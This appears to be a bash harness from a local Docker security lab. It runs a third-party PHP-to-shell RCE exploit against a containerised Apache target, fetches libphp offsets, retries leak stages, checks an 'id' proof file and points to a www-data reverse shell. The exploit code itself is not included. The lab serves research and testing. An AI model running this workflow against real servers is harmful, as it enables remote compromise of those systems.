#!/usr/bin/env bash
# Zer061 exploit.py — align with upstream docker/ (host :19288, proof in out/p1).
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
# shellcheck source=scripts/docker-env.sh
source "$ROOT/scripts/docker-env.sh"
EXPLOIT_DIR="$ROOT/third_party/zer061-php2shell"
EXPLOIT="$EXPLOIT_DIR/exploit.py"
OFFSETS_PY="$EXPLOIT_DIR/docker/offsets.py"
OFFSETS_ENV="$EXPLOIT_DIR/out/offsets.env"
PROOF_HOST="$EXPLOIT_DIR/out/p1"
CONTAINER="${ZER061_CONTAINER:-vtbw-php2shell-apache}"
HOST_URL="${ZER061_URL:-http://127.0.0.1:19288/index.php}"
NET_URL="http://target-apache/index.php"
RETRIES="${ZER061_RETRIES:-8}"
RUNS="${ZER061_RUNS:-5}"

cd "$ROOT"
mkdir -p "$EXPLOIT_DIR/out"
chmod 1777 "$EXPLOIT_DIR/out" 2>/dev/null || true

if [[ ! -f "$EXPLOIT" ]]; then
  echo "FEHLER: $EXPLOIT fehlt — zuerst: $ROOT/scripts/fetch-zer061.sh" >&2
  exit 1
fi

if ! docker ps --format '{{.Names}}' | grep -qx "$CONTAINER"; then
  echo "FEHLER: $CONTAINER läuft nicht — zuerst: $ROOT/scripts/lab-apache-up.sh" >&2
  exit 1
fi

echo "[zer061] Warte auf Apache-Health …"
for _ in $(seq 1 40); do
  if docker inspect "$CONTAINER" --format '{{.State.Health.Status}}' 2>/dev/null | grep -qx healthy; then
    break
  fi
  sleep 0.5
done

if [[ -f "$OFFSETS_PY" ]]; then
  echo "[zer061] libphp-Offsets aus Container $CONTAINER …"
  python3 "$OFFSETS_PY" "$CONTAINER" "$OFFSETS_ENV"
fi

wait_host() {
  for _ in $(seq 1 30); do
    if curl -fsS --max-time 2 "$HOST_URL" >/dev/null 2>&1; then
      return 0
    fi
    sleep 0.5
  done
  return 1
}

USE_HOST=0
if wait_host; then
  USE_HOST=1
  URL="$HOST_URL"
  echo "[zer061] Exploit vom Host (wie upstream README) → $URL"
else
  URL="$NET_URL"
  echo "[zer061] Host :19288 nicht erreichbar — Fallback attacker-Container → $URL" >&2
  echo "[zer061] Tipp: Port prüfen: curl -v $HOST_URL" >&2
fi

echo "[zer061] Proof: $PROOF_HOST (cmd id>/out/p1, retries=$RETRIES, runs=$RUNS)"
echo "[zer061] Interaktives RCE ohne Heap: vtbw-php2shell-lab shell"
echo

clear_proof() {
  rm -f "$PROOF_HOST"
  docker exec "$CONTAINER" rm -f /out/p1 2>/dev/null || true
}

read_proof() {
  if [[ -f "$PROOF_HOST" ]] && [[ -s "$PROOF_HOST" ]]; then
    cat "$PROOF_HOST"
    return 0
  fi
  docker exec "$CONTAINER" cat /out/p1 2>/dev/null || true
}

run_exploit_once() {
  # Auto offsets (OFFSET_DB) — nicht nur ein explizites Paar aus offsets.env
  local -a extra=(--retries "$RETRIES")
  if [[ "$USE_HOST" == "1" ]]; then
    python3 "$EXPLOIT" -u "$URL" --docker-container "$CONTAINER" "${extra[@]}"
  else
    docker compose --profile tools run --rm attacker \
      python3 "/opt/third_party/zer061-php2shell/exploit.py" \
      -u "$URL" "${extra[@]}"
  fi
}

for run in $(seq 1 "$RUNS"); do
  [[ "$run" -gt 1 ]] && echo "[zer061] —— Lauf $run/$RUNS ——"
  clear_proof
  set +e
  OUT="$(run_exploit_once 2>&1)"
  RC=$?
  set -e
  echo "$OUT"

  PROOF="$(read_proof)"
  if [[ -n "$PROOF" ]]; then
    echo
    echo "=== PROOF (verified) ==="
    echo "PROOF: $PROOF"
    if echo "$OUT" | grep -q 'BLIND_OK'; then
      echo "(exploit.py meldet BLIND_OK, weil Proof in /out/p1 liegt — nicht per HTTP --fetch)"
    fi
    echo
    echo "Interaktive Reverse Shell (www-data): ~/Schreibtisch/cursor-projects/vtbw-php2shell-lab zer061-shell"
    exit 0
  fi

  if echo "$OUT" | grep -qE 'HEAP_LEAK_FAILED|LIBPHP_LEAK_FAILED|UNREACHABLE'; then
    echo "[zer061] Stage 1/2 verfehlt — erneuter Lauf …" >&2
    sleep 1
    continue
  fi
  if echo "$OUT" | grep -q 'BLIND_OK'; then
    echo "[zer061] BLIND_OK ohne /out/p1 — Stage 3 nicht verifiziert, erneuter Lauf …" >&2
    sleep 1
    continue
  fi
  [[ "$RC" -ne 0 ]] && sleep 1
done

echo
echo "=== Kein RCE-Nachweis nach $RUNS Läufen ==="
echo "Apache-Target muss Zer061-docker-Config nutzen (nach Update: apache-up mit Recreate)."
echo "  docker compose --profile apache up -d --force-recreate target-apache"
echo "  ZER061_RUNS=15 ZER061_RETRIES=12 ~/Schreibtisch/cursor-projects/vtbw-php2shell-lab zer061"
exit 1
